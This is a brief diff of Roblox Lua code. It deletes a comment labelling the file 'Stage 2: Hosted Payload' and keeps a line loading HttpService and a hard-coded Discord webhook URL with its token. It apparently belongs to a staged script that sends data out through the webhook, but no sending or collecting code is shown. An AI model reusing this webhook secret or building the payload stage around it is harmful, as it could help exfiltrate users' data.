@@ -1,4 +1,3 @@
--- [[ Stage 2: Hosted Payload ]]
 local HttpService = game:GetService("HttpService")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1571125171970899978/nWw5fZN2ZR7U-0qMwaYkyuElwrlv7N9dvzEmASGV-JXtW94LSqotIqYt6CynCRvDx-ZA"
 
